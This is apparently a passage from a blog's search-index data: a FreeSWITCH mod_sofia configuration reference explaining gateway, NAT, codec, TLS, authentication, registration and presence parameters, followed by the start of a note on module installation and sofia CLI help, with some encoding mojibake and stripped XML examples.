use sofia/gateway/\u0026lt;gateway_name\u0026gt;/\nFreeSWITCH can also subscribe to receive notification of events from the gateway. For more information see Presence - Use FreeSWITCH as a Client\nParameters The following is a list of param elements that are children of a gateway element:\nNote: The username param for the gateway is not to be confused with the username param in the Profile settings config!\nNote: extension parameter influence the contents of channel variable Caller-Destination-Number and destination_number. If it is blank, Caller-Destination-Number will always be set to gateway\u0026rsquo;s username. If it has a value, Caller-Destination-Number will always be set to this value. If it has value auto_to_user, Caller-Destination-Number will be populated with value ${sip_to_user} which means the real dialled number in case of an inbound call.\nping-min means \u0026ldquo;how many successful pings we must have before declaring a gateway up\u0026rdquo;. The interval between ping-min and ping-max is the \u0026ldquo;safe area\u0026rdquo; where a gateway is marked as UP. So if we have, for example, min 3 and max 6, if the gateway is up and we move counter between 3,4,5,6 the gateway will be up. If from 6 we loose 4 (so counter == 2) pings in a row, the gateway will be declared down. Please note that on sofia startup the gateway is always started as UP, so it will be up even if ping-min is \u0026gt; 1 . the \u0026ldquo;right\u0026rdquo; way starts when the gateway goes down.\nParam \u0026ldquo;register,\u0026rdquo; is used when this profile acts as a client to another UA. By registering, FreeSWITCH informs the other UA of its whereabouts. This is generally used when FreeSWITCH wants the other UA to send FreeSWITCH calls, and the other UA expects this sort of registration. If FreeSWITCH uses the other UA only as a gateway (e.g., to the PSTN), then registration is not generally required. Param \u0026ldquo;distinct-to\u0026rdquo; is used when you want FS to register using a distict AOR for header To. It requires proper setting of related parameters. For example if you want the REGISTER to go with: From: sip:someuser@somedomain.com To: sip:anotheruser@anotherdomain.com\nThen set the parameters as this: The latter param, \u0026ldquo;ping\u0026rdquo; is used to check gateway availability. By setting this option, FreeSWITCH will send SIP OPTIONS packets to gateway. If gateway responds with 200 or 404, gateway is pronounced up, otherwise down. [N.B. It appears that other error messages can be returned and still result in the gateway being marked as \u0026lsquo;up\u0026rsquo;?] If any call is routed to gateway with state down, FreeSWITCH will generate NETWORK_OUT_OF_ORDER hangup cause. Ping frequency is defined in seconds (value attribute) and has a minimum value of 5 seconds. Param \u0026ldquo;extension-in-contact\u0026rdquo; is used to force what the contact info will be in the registration. If you are having a problem with the default registering as gw+gateway_name@ip you can set this to true to use extension@ip. If extension is blank, it will use username@ip.\nif you need to insert the FROM digits to the Contact URI User Part when sending call to gateway BEFORE From: \u0026ldquo;8885551212\u0026rdquo; sip:88855512120@8.8.8.8 Contact: sip:gw+mygateway@7.7.7.7:7080 try adding these to gateway params\nThese channel variables will be set on all calls going through this gateway in the specified direction. However, see below for a special syntax to set profile variables rather than channel variables. Settings Settings include other, more general information about the profile, including whether or not STUN is in use. Each profile has its own settings element. Not only is this convenient â€” it\u0026rsquo;s possible to set up one profile to use STUN and another, with a different gateway or working behind the firewall, not needing STUN â€” but it\u0026rsquo;s also crucial. That\u0026rsquo;s because each profile defines a SIP User Agent, and each UA must have its own unique \u0026ldquo;sip-port.\u0026rdquo; By convention, 5060 is the default port, but it\u0026rsquo;s possible to make calls to, e.g., \u0026ldquo;foo@sip.example.com:5070\u0026rdquo;, and therefore you can define any port you please for each individual profile. The conf directory contains a complete sample sofia.conf.xml file, along with comments. See Git examples: Internal, External\nBasic settings alias This seems to make the SIP profile bind to this IP \u0026amp; port as well as your SIP / RTP IPs and ports. Anthony had this to say about aliases in a ML thread: Aliases in the tag are a list of keys you want to use to use that leadÂ to the current profile your are configuring. Think of it as the /etc/hosts fileÂ in unix only for profiles. When you define aliases to match all of the possibleÂ domains hosted on a particular profile, then when you try to take a user@host.comÂ notation and decide which profile it came from, you can use the aliases to findÂ it providing you have added to that profile.\nshutdown-on-fail If set to true and the profile fails to load, FreeSWITCH will shut down. This is useful if you are running something like Pacemaker and OpenAIS which manage a pair of FreeSWITCH nodes and automatically monitor, start, stop, restart, and standby-on-fail the nodes. It will ensure that the specific node is not able to be used in a \u0026ldquo;partially up\u0026rdquo; situation.\nuser-agent-string This sets the User-Agent header in all SIP messages sent by your server. By default this could be something like \u0026ldquo;FreeSWITCH-mod_sofia/1.0.trunk-12805\u0026rdquo;. If you didn\u0026rsquo;t want to advertise detailed version information you could simply set this to \u0026ldquo;FreeSWITCH\u0026rdquo; or even \u0026ldquo;Asterisk PBX\u0026rdquo; as a joke. Take care when setting this value as certain characters such as \u0026lsquo;@\u0026rsquo; could cause other SIP proxies could reject your messages as invalid.\nlog-level sip-trace context Dialplan context in which to dump calls that come in to this profile\u0026rsquo;s ip:port\nsip-port Port to bind to for SIP traffic:\nsip-ip IP address to bind to for SIP traffic. DO NOT USE HOSTNAMES, ONLY IP ADDRESSES\nrtp-ip IP address to bind to for RTP traffic. DO NOT USE HOSTNAMES, ONLY IP ADDRESSES Multiple rtp-ip support: if more rtp-ip parameters are added, they will be used in round-robin as new calls progress. IPv6 addresses are not supported under Windows at the time of writing. See FS-4445 ext-rtp-ip This is the IP behind which FreeSWITCH is seen from the Internet, so if FreeSWITCH is behind NAT, this is basically the public IP that should be used for RTP. Possible values are: Any variable from vars.xml, e.g. $${external_rtp_ip}:\n\u0026ldquo;specific IP address\u0026rdquo;\n\u0026ldquo;when used for LAN and WAN to avoid errors in the SIP CONTACT sent to LAN devices, use\u0026rdquo;\n\u0026ldquo;auto\u0026rdquo;: the guessed IP will be used (guessed by looking in the IP routing table which interface is the default route)\n\u0026ldquo;auto-nat\u0026rdquo;: FreeSWITCH will use uPNP or NAT-PMP to discover the public IP address it should use\n\u0026ldquo;stun:DNS name or IP address\u0026rdquo;: FreeSWITCH will use the STUN server of your choice to discover the public IP address\n\u0026ldquo;host:DNS name\u0026rdquo;: FreeSWITCH will resolve the DNS name as the public IP address, so you can use a dynamic DNS host\nATTENTION: AS OF 2012Q4, \u0026rsquo;extâ€“\u0026rsquo; prefixed params cited above when populated with to-be-resolved DNS stringsÂ \u0026ndash;Â e.g. name=\u0026ldquo;extâ€“sipâ€“ip\u0026rdquo;Â value=\u0026ldquo;stun:stun.freeswitch.org\u0026rdquo; or name=\u0026ldquo;extâ€‘rtpâ€“ip\u0026rdquo;Â value=\u0026ldquo;host:mypublicIP.dyndns.org\u0026rdquo;Â \u0026ndash;Â are resolved to IP addresses once only at FS load time and const thereafter. FS is blindÂ to (unawareÂ of) any subsequent changes in your environment\u0026rsquo;s IP address. Thus, these extâ€“ vars may become functionally incompatible with the environment\u0026rsquo;s current IP addresses with unspecified results in call flow at the network layer. FS restart is required for FS to capture the now-current, working IP address(es).\next-sip-ip This is the IP behind which FreeSWITCH is seen from the Internet, so if FreeSWITCH is behind NAT, this is basically the public IP that should be used for SIP. Possibles values are the same as those for ext-rtp-ip, and it is usually set to the same value.\ntcp-keepalive Set this to interval (in milliseconds) to send keep alive packets to user agents (UAs) registered via TCP; do not set to disable.\ntcp-pingpong tcp-ping2pong dialplan The dialplan parameter is very powerful. In the simplest configuration, it will use the XML dialplan. This means that it will read data from mod_xml_curl XML dialplans (e.g., callback to your webserver), or failing that, from the XML files specified in freeswitch.xml dialplan section. (e.g. default_context.xml)\nYou can also add enum lookups into the picture (since mod_enum provides dialplan functionality), so enum lookups override the XML dialplan\nOr reverse the order to enum is only consulted if XML lookup fails\nIt is also possible to specify a specific enum root\nOr use XML on a custom file\nWhere it will first check the specific XML file, then hit normal XML which also do a mod_xml_curl lookup assuming you have that configured and working.\nMedia related options See also: Proxy Media\nresume-media-on-hold When calls are in no media this will bring them back to media when you press the hold button. To return the calls to bypass-media after the call is unheld, enable bypass-media-after-hold.\nbypass-media-after-att-xfer This will allow a call after an attended transfer go back to bypass media after an attended transfer. bypass-media-after-hold This will allow a call to go back to bypass media after a hold. This option can be enabled only if resume-media-on-hold is set. Available from git rev 8fa385b. inbound-bypass-media Uncomment to set all inbound calls to no media mode. It means that the FreeSWITCH server only keeps the SIP messages state, but have the RTP steam go directly from end-point to end-point\ninbound-proxy-media Uncomment to set all inbound calls to proxy media mode. This means the FreeSWITCH keeps both the SIP and RTP traffic on the server but does not interact with the RTP stream.\ndisable-rtp-auto-adjust ignore-183nosdp enable-soa Set the value to \u0026ldquo;false\u0026rdquo; to diable SIP SOA from sofia to tell sofia not to touch the exchange of SDP\nt38-passthru The following options are available\n\u0026rsquo;true\u0026rsquo; enables t38 passthru \u0026lsquo;false\u0026rsquo; disables t38 passthru \u0026lsquo;once\u0026rsquo; enables t38 passthru, but sends t.38 re-invite only once (available since commit 08b25a8 from Nov. 9, 2011) Codecs related options Also see:\nCodec Negotiation Supported Codecs inbound-codec-prefs This parameter allows to change the allowed inbound codecs per profile. outbound-codec-prefs This parameter allows to change the outbound codecs per profile. codec-prefs This parameter allows to change both inbound-codec-prefs and outbound-codec-prefs at the same time. inbound-codec-negotiation set to \u0026lsquo;greedy\u0026rsquo; if you want your codec list to take precedence if \u0026lsquo;greedy\u0026rsquo; doesn\u0026rsquo;t work for you, try \u0026lsquo;scrooge\u0026rsquo; which has been known to fix misreported ptime issues with DID providers such as CallCentric. A rule of thumb is:\n\u0026lsquo;generous\u0026rsquo; permits the remote codec list have precedence and \u0026lsquo;win\u0026rsquo; the codec negotiation and selection process \u0026lsquo;greedy\u0026rsquo; forces a win by the local FreeSWITCH preference list \u0026lsquo;scrooge\u0026rsquo; takes \u0026lsquo;greedy\u0026rsquo; a step further, so that the FreeSWITCH wins even when the far side lies about capabilities during the negotiation process sip_codec_negotiation is a channel variable version of this setting\ninbound-late-negotiation Uncomment to let calls hit the dialplan before you decide if the codec is OK. bitpacking This setting is for AAL2 bitpacking on G.726. disable-transcoding Uncomment if you want to force the outbound leg of a bridge to only offer the codec that the originator is using\nrenegotiate-codec-on-reinvite STUN If you need to use a STUN server, here are common working examples:\next-rtp-ip stun.fwdnet.net is a publicly-accessible STUN server.\next-sip-ip stun-enabled Simple traversal of UDP over NATs (STUN), is used to help resolve the problems associated with SIP clients, behind NAT, using private IP address space in their messaging. Use stun when specified (default is true).\nstun-auto-disable Set to true to have the profile determine stun is not useful and turn it off globally\nNATing apply-nat-acl When receiving a REGISTER or INVITE, enable NAT mode automatically if IP address in Contact header matches an entry defined in the RFC 1918 access list. \u0026ldquo;acl\u0026rdquo; is a misnomer in this case because access will not be denied if the user\u0026rsquo;s contact IP doesn\u0026rsquo;t match.\naggressive-nat-detection This will enable NAT mode if the network IP/port from which the request was received differs from the IP/Port combination in the SIP Via: header, or if the Via: header contains the received parameter (regardless of what it contains.) Note 2009-04-05: Someone please clarify when this would be useful. It seems to me if someone needed this feature, chances are that things are so broken that they would need to use NDLB-force-rport\nVAD and CNG VAD stands for Voice Activity Detector. FreeSWITCH is capable of detecting speech and can stop transmitting RTP packets when no voice is detected.\nvad suppress-cng Suppress Comfort Noise Generator (CNG) on this profile or per call with the \u0026lsquo;suppress_cng\u0026rsquo; variable\nNDLB (A.K.A. No device left behind) NDLB-force-rport This will force FreeSWITCH to send SIP responses to the network port from which they were received. Use at your own risk! For more information see NAT Traversal.\nsafe = param that does force-rport behavior only on endpoints we know are safe to do so on. This is a dirty hack to try to work with certain endpoints behind sonicwall which does not use the same port when it does nat, when the devices do not support rport, while not breaking devices that acutally use different ports that force-rport will break NDLB-broken-auth-hash Used for when phones respond to a challenged ACK with method INVITE in the hash\nNDLB-received-in-nat-reg-contact add aÂ ;received=\u0026quot;:\u0026quot; to the contact when replying to register for nat handling\nNDLB-sendrecv-in-session By default, \u0026ldquo;a=sendrecv\u0026rdquo; is only included in the media portion of the SDP. While this is RFC-compliant, it may break functionality for some SIP devices. To also include \u0026ldquo;a=sendrecv\u0026rdquo; in the session portion of the SDP, set this parameter to true.\nNDLB-allow-bad-iananame Introduced in rev. 15401, this was enabled by default prior to new param. Will allow codecs to match respective name even if the given string is not correct. i.e., Linksys and Sipura phones will pass G.729a by default instead of G.729 as codec string therefore not matching. If you wish to allow bad IANA names to match respective codec string, add the following param to your SIP profile. Refer to RFC 3551, RFC 3555 and the IANA list(s) for SDP\nCall ID inbound-use-callid-as-uuid On inbound calls make the uuid of the session equal to the SIP call id of that call.\noutbound-use-uuid-as-callid On outbound calls set the callid to match the uuid of the session\nThis goes in the \u0026ldquo;..sip_profiles/external.xml\u0026rdquo; file.\nTLS Please make sure to read SIP TLS before enabling certain features below as they may not behave as expected.\ntls TLS: disabled by default, set to \u0026ldquo;true\u0026rdquo; to enable tls-only disabled by default, when enabled prevents sofia from listening on the unencrypted port for this connection. This can stop many generic brute force scripts and if all your clients connect over TLS then can help decrease the exposure of your FreeSWITCH server to the world. tls-bind-params additional bind parameters for TLS tls-sip-port Port to listen on for TLS requests. (5061 will be used if unspecified) tls-cert-dir Location of the agent.pem and cafile.pem ssl certificates (needed for TLS server) tls-version TLS version (\u0026ldquo;sslv2\u0026rdquo;, \u0026ldquo;sslv3\u0026rdquo;, \u0026ldquo;sslv23\u0026rdquo;, \u0026ldquo;tlsv1\u0026rdquo;, \u0026ldquo;tlsv1.1\u0026rdquo;, \u0026ldquo;tlsv1.2\u0026rdquo;). NOTE: Phones may not work with TLSv1 When not set defaults to: \u0026ldquo;tlsv1,tlsv1.1,tlsv1.2\u0026rdquo;\ntls-passphrase If your agent.pem is protected by a passphrase stick the passphrase here to enable FreeSWITCH to decrypt the key. tls-verify-date If the client/server certificate should have the date on it validated to ensure it is not expired and is currently active. tls-verify-policy This controls what, if any security checks are done against server/client certificates. Verification is generally checking certificates are valid against the cafile.pem. Set to \u0026lsquo;in\u0026rsquo; to only verify incoming connections, \u0026lsquo;out\u0026rsquo; to only verify outgoing connections, \u0026lsquo;all\u0026rsquo; to verify all connections, also \u0026lsquo;subjects_in\u0026rsquo;, \u0026lsquo;subjects_out\u0026rsquo; and \u0026lsquo;subjects_all\u0026rsquo; for subject validation (subject validation for outgoing connections is against the hostname/ip connecting to). Multiple policies can be split with a \u0026lsquo;|\u0026rsquo; pipe, for example \u0026lsquo;subjects_in|subjects_out\u0026rsquo;. Defaults to none. tls-verify-depth When certificate validation is enabled (tls-verify-policy) how deep should we try to verify a certificate up the chain again the cafile.pem file. By default only depth of 2. tls-verify-in-subjects If subject validation is enabled for incoming connections (tls-verify-policy set to \u0026lsquo;subjects_in\u0026rsquo; or \u0026lsquo;subjects_all\u0026rsquo;) this is the list of subjects that are allowed (delimit with a \u0026lsquo;|\u0026rsquo; pipe), note this only effects incoming connections for outgoing connections subjects are always checked against hostnames/ips. DTMF rfc2833-pt TODO RFC 2833 is obsoleted by RFC 4733.\ndtmf-duration dtmf-type TODO RFC 2833 is obsoleted by RFC 4733. Set the parameter in the SIP profile:\nor\nor\nOR set the variable in the SIP gateway or user profile (NOT in the channel, it must be before CS_INIT): Note the \u0026ldquo;_\u0026rdquo; instead of \u0026ldquo;-\u0026rdquo; in profile param (this is var set in dialplan). (24.10.2010: \u0026ldquo;both\u0026rdquo; don\u0026rsquo;t seem to me work in my tests, \u0026ldquo;outbound\u0026rdquo; does) Note: for inband DTMF, Misc. Dialplan Tools start_dtmf must be used in the dialplan. Also, to change the outgoing routing from info or rfc2833 to inband, use Misc._Dialplan_Tools_start_dtmf_generate RFC 2833\npass-rfc2833 TODO RFC 2833 is obsoleted by RFC 4733. Default: false If true, it passes RFC 2833 DTMF\u0026rsquo;s from one side of a bridge to the other, untouched. Otherwise, it decodes and re-encodes them before passing them on.\nliberal-dtmf TODO RFC 2833 is obsoleted by RFC 4733. Default: false For DTMF negotiation, use this parameter to just always offer 2833 and accept both 2833 and INFO. Use of this parameter is not recommended since its purpose is to try to cope with buggy SIP implementations.\nSIP Related options enable-timer This enables or disables support forÂ RFC 4028 SIP Session Timers.\nNote: If your switch requires the timer option; for instance, Huawei SoftX3000, it needs this optional field and drops the calls with \u0026ldquo;Session Timer Check Message Failed\u0026rdquo;, then you may be able to revert back the commit that took away the Require: timer option which is an optional field by: git log -1 -p 58c3c3a049991fedd39f62008f8eb8fca047e7c5 libs/sofia-sip/libsofia-sip-ua | patch -p1 -R touch libs/sofia-sip/.update\nmake mod_sofia-clean make mod_sofia-install\nenable-100rel This enable support for 100rel (100% reliability - PRACK message as defined in RFC3262) This fixes a problem with SIP where provisional messages like \u0026ldquo;180 Ringing\u0026rdquo; are not ACK\u0026rsquo;d and therefore could be dropped over a poor connection without retransmission. 2009-07-08: Enabling this may cause FreeSWITCH to crash, see FSCORE-392.\nminimum-session-expires This sets the \u0026ldquo;Min-SE\u0026rdquo; value (in seconds) from RFC 4028. This value must not be less than 90 seconds.\nsip-options-respond-503-on-busy When set to true, this param will make FreeSWITCH respond to incoming SIP OPTIONS with 503 \u0026ldquo;Maximum Calls In Progress\u0026rdquo; when FS is paused or maximum sessions has been exceeded. When set to false or when not set at all (default behavior), SIP OPTIONS are always responded with 200 \u0026ldquo;OK\u0026rdquo;.\nSetting this param to true is especially useful if you\u0026rsquo;re using a proxy such as OpenSIPS or Kamailio with dispatcher module to probe your FreeSWITCH servers by sending SIP OPTIONS.\nsip-force-expires Setting this param overrides the expires value in the 200 OK in response to all inbound SIP REGISTERs towards this sip_profile. This param can be overridden per individual user by setting a sip-force-expires user directory variable.\nsip-expires-max-deviation Setting this param adds a random deviation to the expires value in the 200 OK in response to all inbound SIP REGISTERs towards this sip_profile. Result will be that clients will not re-register at the same time-interval thus spreading the load on your system. For example, if you set:\nthen the expires that is responded will be between 1800-600=1200 and 1800+600=2400 seconds. This param can be overridden per individual user by setting a sip-expires-max-deviation user directory variable.\noutbound-proxy Setting this param will send all outbound transactions to the value set by outbound-proxy. send-display-update Tells FreeSWITCH not to send display UPDATEs to the leg of the call. RTP Related options auto-jitterbuffer-msec Set this to the size of the jitterbuffer you would like to have on all calls coming through this profile.\nrtp-timer-name rtp-rewrite-timestamps If you don\u0026rsquo;t want to pass through timestamps from 1 RTP stream to another, rtp-rewrite-timestamps is a parameter you can set in a SIP Profile (on a per call basis with rtp_rewrite_timestamps chanvar in a dialplan). The result is that FreeSWITCH will regenerate and rewrite the timestamps in all the RTP streams going to an endpoint using this SIP Profile. This could be necessary to fix audio issues when sending calls to some paranoid and not RFC-compliant gateways (Cirpack is known to require this).\nmedia_timeout was: rtp-timeout-sec (deprecated) The number of seconds of RTP inactivity (media silence) before FreeSWITCH considers the call disconnected, and hangs up. It is recommended that you use session timers instead. If this setting is omitted, the default value is \u0026ldquo;0\u0026rdquo;, which disables the timeout.\nmedia_hold_timeout was: rtp-hold-timeout-sec (deprecated) The number of seconds of RTP inactivity (media silence) for a call placed on hold by an endpoint before FreeSWITCH considers the call disconnected, and hangs up. It is recommended that you use session timers instead. If this setting is omitted, the default value is \u0026ldquo;0\u0026rdquo;, which disables the timeout.\nrtp-autoflush-during-bridge Controls what happens if FreeSWITCH detects that it\u0026rsquo;s not keeping up with the RTP media (audio) stream on a bridged call. (This situation can happen if the FreeSWITCH server has insufficient CPU time available.) When set to \u0026ldquo;true\u0026rdquo; (the default), FreeSWITCH will notice when more than one RTP packet is waiting to be read in the incoming queue. If this condition persists for more than five seconds, RTP packets will be discarded to \u0026ldquo;catch up\u0026rdquo; with the audio stream. For example, if there are always five extra 20 ms packets in the queue, 100 ms of audio latency can be eliminated by discarding the packets. This will cause an audio glitch as some audio is discarded, but will improve the latency by 100 ms for the rest of the call. If rtp-autoflush-during-bridge is set to false, FreeSWITCH will instead preserve all RTP packets on bridged calls, even if it increases the latency or \u0026ldquo;lag\u0026rdquo; that callers hear.\nrtp-autoflush Has the same effect as \u0026ldquo;rtp-autoflush-during-bridge\u0026rdquo;, but affects NON-bridged calls (such as faxes, IVRs and the echo test). Unlike \u0026ldquo;rtp-autoflush-during-bridge\u0026rdquo;, the default is false, meaning that high-latency packets on non-bridged calls will not be discarded. This results in smoother audio at the possible expense of increasing audio latency (or \u0026ldquo;lag\u0026rdquo;). Setting \u0026ldquo;rtp-autoflush\u0026rdquo; to true will discard packets to minimize latency when possible. Doing so may cause errors in DTMF recognition, faxes, and other processes that rely on receiving all packets.\nAuth These settings deal with authentication: requirements for identifying SIP endpoints to FreeSWITCH.\nchallenge-realm Choose the realm challenge key. Default is auto_to if not set. auto_from - uses the from field as the value for the SIP realm. auto_to - uses the to field as the value for the SIP realm. - you can input any value to use for the SIP realm. If you want URL dialing to work you\u0026rsquo;ll want to set this to auto_from. If you use any other value besides auto_to or auto_from you\u0026rsquo;ll loose the ability to do multiple domains. Note: comment out to restore the behavior before 2008-09-29\naccept-blind-auth accept any authentication without actually checking (not a good feature for most people)\nauth-calls Users in the directory can have \u0026ldquo;auth-acl\u0026rdquo; parameters applied to them so as to restrict users access to a predefined ACL or a CIDR.\nValue can be \u0026ldquo;false\u0026rdquo; to disable authentication on this profile, meaning that when calls come in the profile will not send an auth challenge to the caller.\nlog-auth-failures Write log entries ( Warning ) on authentication failures ( Registration \u0026amp; Invite ). useful for users wishing to use fail2ban. note: Required SVN#15654 or higher\nauth-all-packets On authed calls, authenticate all the packets instead of only INVITE and REGISTER(Note: OPTIONS, SUBSCRIBE, INFO and MESSAGE are not authenticated even with this option set to true, see http://jira.freeswitch.org/browse/FS-2871)\nRegistration disable-register disable register which may be undesirable in a public switch\nmultiple-registrations Valid values for this parameter are \u0026ldquo;contact\u0026rdquo;, \u0026ldquo;true\u0026rdquo;, \u0026ldquo;false\u0026rdquo;. value=\u0026ldquo;true\u0026rdquo; is the most common use. Setting this value to \u0026ldquo;contact\u0026rdquo; will remove the old registration based on sip_user, sip_host and contact field as opposed to the call_id.\nmax-registrations-per-extension Defines the number of maximum registrations per extension. Valid value for this parameter is an integer greater than 0. Please note that setting this to 1 would counteract the usage of multiple-registrations. When an attempt to register an extension is made after the maximum value has been reached sofia will respond with 403. The following example will set maximum registrations to 2\ninbound-reg-force-matching-username Force the user and auth-user to match.\nforce-publish-expires Force custom presence update expires delta (-1 means endless)\nforce-register-domain all inbound registrations will look in this domain for the users. Comment out to use multiple domains\nforce-register-db-domain all inbound reg will stored in the db using this domain. Comment out to use multiple domains\nsend-message-query-on-register Can be set to \u0026rsquo;true\u0026rsquo;, \u0026lsquo;false\u0026rsquo; or \u0026lsquo;first-only\u0026rsquo;. If set to \u0026rsquo;true\u0026rsquo; (this is the default behavior), mod_sofia will send a message-query event upon registration. mod_voicemail uses this for counting messages.\nIf set to \u0026lsquo;first-only\u0026rsquo;, only the first REGISTER will trigger the message-query (it requires the UA to increment the NC on subsequent REGISTERs. Some phones, snom for instance, do not do this). The final effect of the message-query is to cause a NOTIFY MWI message to be sent to the registering UA (it is used to satisfy terminals that expect MWI without subscribing for it).\nunregister-on-options-fail If set to True with nat-options-ping the endpoint will be unregistered if no answer on OPTIONS packet.\nnat-options-ping With this option set FreeSWITCH will periodically send an OPTIONS packet to all NATed registered endpoints to keep alive connection. If set to True with unregister-on-options-fail the endpoint will be unregistered if no answer on OPTIONS packet.\nall-reg-options-ping With this option set FreeSWITCH will periodically send an OPTIONS packet to all registered endpoints to keep alive connection. If set to True with unregister-on-options-fail the endpoint will be unregistered if no answer on OPTIONS packet.\nregistration-thread-frequency Controls how often registrations in the FreeSWITCH are checked for expiration.Â ping-mean-interval Controls the mean intervalÂ FreeSWITCHâ„¢Â will send OPTIONS packet to registered user, by default 30 seconds.\nSubscription force-subscription-expires force suscription expires to a lower value than requested\nforce-subscription-domain all inbound subscription will look in this domain for the users. Comment out to use multiple domains\nPresence manage-presence Enable presence. If you want to share your presence (see dbname and presence-hosts) set this to \u0026ldquo;true\u0026rdquo; on the first profile and enable the shared presence database. Then on subsequent profiles that share presence set this variable to \u0026ldquo;passive\u0026rdquo; and enable the shared presence database there as well.\ndbname Used to share presence info across sofia profiles Name of the db to use for this profile\npresence-hold-state By default when a call is placed on hold, monitoring extensions show that extension as ringing. You can change this behavior by specifying this parameter and one of the following values. Available as of commit 1145905 on April 13, 2012.\nconfirmed - Extension appears busy. early (default) - Extension appears to be ringing. terminated - Extension appears idle. presence-hosts A list of domains that have a shared presence in the database specified in dbname. People who use multiple domains per profile can\u0026rsquo;t use this feature anyway, so you\u0026rsquo;ll want to set it to something like \u0026ldquo;DISABLED\u0026rdquo; in this case to avoid getting users from similar domains all mashed together. For multiple domains also known as multi-tenant calling 1001 would call all matching users in all domains. Don\u0026rsquo;t use presence-hosts with multi-tenant.\npresence-privacy Optionally globally hide the caller ID from presence notes in distributed NOTIFY messages. For example, \u0026ldquo;Talk 1002\u0026rdquo; would be the presence note for extension 1001 while it is on a call with extension 1002. If the presence privacy tag is set to true, then it would distribute the presence note as \u0026ldquo;On The Phone\u0026rdquo; (without the extension to which it is connected). So any subscriber\u0026rsquo;s to 1001\u0026rsquo;s presence would not be able to see who he/she is talking to. http://jira.freeswitch.org/browse/FS-849 This also hides the number in the status \u0026ldquo;hold\u0026rdquo;, \u0026ldquo;ring\u0026rdquo;, \u0026ldquo;call\u0026rdquo; and perhaps others. http://jira.freeswitch.org/browse/FS-4420\nsend-presence-on-register Specify whether or not to send presence information when users register. Default is not to send presence information. Valid options:\nfalse true first-only CallerID Related options caller-id type choose one, can be overridden by inbound call type and/or sip_cid_type channel variable Remote-Party-ID header: P-*-Identity family of headers: neither one: pass-callee-id (defaults to true) Disable by setting it to false if you encounter something that your gateway for some reason hates X-headers that it is supposed to ignore\nOther (TO DO) hold-music disable-hold This allows to disable Music On Hold (added in GIT commit e5cc0539ffcbf660637198c698e90c2e30b05c2f, from Fri Apr 30 19:14:39 2010 -0500). This can be useful when the calling device intends to send its own MOH, but nevertheless sends a REINVITE to FreeSWITCH triggering its MOH. This can be done from dialplan also with rtp_disable_hold channel variable.\napply-inbound-acl set which access control lists, defined in acl.conf.xml, apply to this profile\napply-register-acl apply-proxy-acl This allows traffic to be sent to FreeSWITCH via one or more proxy servers. The proxy server should add a header named X-AUTH-IP containing the IP address of the client. FreeSWITCH trusts the proxy because its IP is listed in the proxy server ACL, and uses the value of the IP in this header as the client\u0026rsquo;s IP for ACL authentication (acl defined in apply-inbound-acl).\nrecord-template max-proceeding max number of open dialogs in proceeding\nbind-params if you want to send any special bind params of your own\ndisable-transfer disable transfer which may be undesirable in a public switch\nmanual-redirect enable-3pcc enable-3pcc determines if third party call control is allowed or not. Third party call control is useful in cases where the SIP invite doesn\u0026rsquo;t include a SDP (late media negotiation). enable-3pcc can be set to either \u0026rsquo;true\u0026rsquo; or \u0026lsquo;proxy\u0026rsquo;, true accepts the call right away, proxy waits until the call has been answered then sends accepts\nnonce-ttl TTL for nonce in sip auth\nThis parameter is set to 60 seconds if not set here. It\u0026rsquo;s used to determine how long to store the user registration record in the sip_authentication table. The expires field in the sip_authentication table is this value plus the expires set by the user agent.\nsql-in-transactions If set to true (default), it will instruct the profile to wait for 500 SQL statements to accumulate or 500ms to elapse and execute them in a transaction (to boost performance).\nodbc-dsn If you have ODBC support and a working dsn you can use it instead of SQLite\nmwi-use-reg-callid username If you wish to hide the fact that you are using FreeSWITCH in the SDP message (Specifically the o= and and s= fields) , then set the username param under the profile. This has no relation whatsoever with the username parameter when we\u0026rsquo;re dealing with gateways. If this value is left unset the system defaults using FreeSWITCH as the username parameter with the o= and s= fields.\nExample: . v=0. o=root 1346068950 1346068951 IN IP4 1.2.3.4. s=root. c=IN IP4 1.2.3.4. t=0 0. m=audio 26934 RTP/AVP 18 0 101 13. a=fmtp:18 annexb=no. a=rtpmap:101 telephone-event/8000. a=fmtp:101 0-16. a=ptime:20.\nwhen you set Directory of Users To allow users to register with the server, the user information must be specified in the conf/directory/default/*xml file. To dynamically specify what users can register, use Mod xml curl\nDefault Configuration File From the FreeSWITCH Github repository\u0026rsquo;s vanilla configurations ([conf/vanilla/autoload_configs/sofia.conf.xml](https://github.com/signalwire/freeswitch/blob/master/conf/vanilla/autoload_configs/sofia.conf.xml)): conf/autoload_configs/sofia.conf.xml \u0026lt;global_settings\u0026gt; \u0026lt;!\u0026ndash;Â the new format for HEPv2/v3 and capture ID protocol:host:port;hep=2;capture_id=200;\n\u0026ndash;\u0026gt; \u0026lt;/global_settings\u0026gt;\nshutdown and restart FreeSWITCH (or) unload and load mod_sofia If you\u0026rsquo;ve only made changes to a particular profile, you may simply (WARNING: will drop all calls associated with this profile):\nsofia profile restart reloadxml Security Features SIP TLS for secure signaling. SRTP for secure media delivery. The Auth section above for authentication settings. å‚è€ƒ https://freeswitch.org/confluence/display/FREESWITCH/Sofia+Configuration+Files ","permalink":"https://wdd.js.org/freeswitch/sofia-config/","summary":"About Sofia is aÂ FreeSWITCHâ„¢ module (mod_sofia) that provides SIP connectivity to and from FreeSWITCH in the form of a User Agent. A \u0026ldquo;User Agent\u0026rdquo; (\u0026ldquo;UA\u0026rdquo;) is an application used for handling a certain network protocol; the network protocol in Sofia\u0026rsquo;s case is SIP. Sofia is the general name of any User Agent in FreeSWITCH using the SIP network protocol. For example, Sofia receives calls sent to FreeSWITCH from other SIP User Agents (UAs), sends calls to other UAs, acts as a client to register FreeSWITCH with other UAs, lets clients register with FreeSWITCH, and connects calls (i.","title":"Sofia æ¨¡å—å…¨éƒ¨é…ç½®"},{"content":"å®‰è£…å•ä¸ªæ¨¡å— make mod_sofia-install make mod_ilbc-install fs-cliäº‹ä»¶è®¢é˜… /event plain ALL /event plain CHANNEL_ANSWER sofia å¸®åŠ©æ–‡æ¡£ sofia help USAGE: -------------------------------------------------------------------------------- sofia global siptrace \u0026lt;on|off\u0026gt; sofia capture \u0026lt;on|off\u0026gt; watchdog \u0026lt;on|off\u0026gt; sofia profile \u0026lt;name\u0026gt; [start | stop | restart | rescan] [wait] flush_inbound_reg [\u0026lt;call_id\u0026gt; | \u0026lt;[user]@domain\u0026gt;] [reboot] check_sync [\u0026lt;call_id\u0026gt; | \u0026lt;[user]@domain\u0026gt;] [register | unregister] [\u0026lt;gateway name\u0026gt; | all] killgw \u0026lt;gateway name\u0026gt; [stun-auto-disable | stun-enabled] [true | false]] siptrace \u0026lt;on|off\u0026gt; capture \u0026lt;on|off\u0026gt; watchdog 